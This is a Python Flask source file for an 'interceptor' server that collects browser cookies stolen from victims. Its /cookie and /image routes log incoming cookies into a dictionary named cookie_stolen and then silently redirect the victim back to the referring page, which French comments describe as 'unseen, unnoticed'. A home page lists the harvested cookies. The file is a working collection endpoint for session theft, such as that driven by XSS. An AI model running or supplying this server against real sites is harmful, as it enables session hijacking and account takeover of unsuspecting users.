from flask import Flask, render_template, request, redirect, url_for, make_response
import jwt
from datetime import datetime, timezone, timedelta
from functools import wraps
import uuid
from dotenv import load_dotenv
import os
from werkzeug.datastructures import ImmutableMultiDict

app = Flask(__name__)

cookie_stolen = {}


def add_cookie(cookie):
    print(f"Adding cookie: {cookie}, {type(cookie)=}")
    if type(cookie) is dict:
        print(f"normal {cookie.key=} {cookie.value=}")
        cookie_stolen[cookie.key] = cookie.value
    elif type(cookie) is ImmutableMultiDict:
        print(f"werkzeug {cookie.keys()=} {cookie.values()=} {cookie.items()=}")
        key = "AUTOGEN" + uuid.uuid4().hex
        cookie_item: dict[str, str] = dict()
        for k, v in cookie.items():
            print(f"adding {k}={v}")
            cookie_item[k] = str(v)
        cookie_stolen[key] = cookie_item
    else:
        key = "AUTOGEN" + uuid.uuid4().hex
        cookie_item: dict[str, str] = dict(
            item.split("=", 1) for item in cookie.split("; ")
        )
        for k, v in cookie_item.items():
            print(f"adding {k}={v}")
            cookie_item[k] = str(v)
        cookie_stolen[key] = cookie_item


@app.route('/cookie/<string:cookie>', methods=['GET'])
def receive_cookie(cookie):
    print(f"/receive_cookie")
    print(f"{cookie=}")
    # add cookie
    add_cookie(cookie)
    # redict au site d'origine: ni vu ni connu
    redirection = redirect(request.referrer or url_for('www.google.com'))  # oui j'ai stressé pour le www.google.com
    response = make_response(redirection)
    return response


@app.route('/image/<string:img>', methods=['GET'])
def receive_image(img):
    print(f"/receive_image")
    cookie = request.cookies
    print(f"{cookie=}")
    # add cookie
    add_cookie(cookie)
    # redict au site d'origine: ni vu ni connu
    redirection = redirect(request.referrer or url_for('www.google.com'))  # oui j'ai stressé pour le www.google.com
    response = make_response(redirection)
    return response


@app.route('/')
def home():
    return render_template('cookie.html', cookie=cookie_stolen)


if __name__ == '__main__':
    load_dotenv()
    host = os.getenv("FLASK_HOST")
    port = int(os.getenv("FLASK_PORT_INTERCEPTOR"))
    print(f"Starting interceptor on {host}:{port}")
    app.run(host=host, port=port,
            ssl_context=("certificates/loutreserver.crt", "certificates/loutreserver.key"))
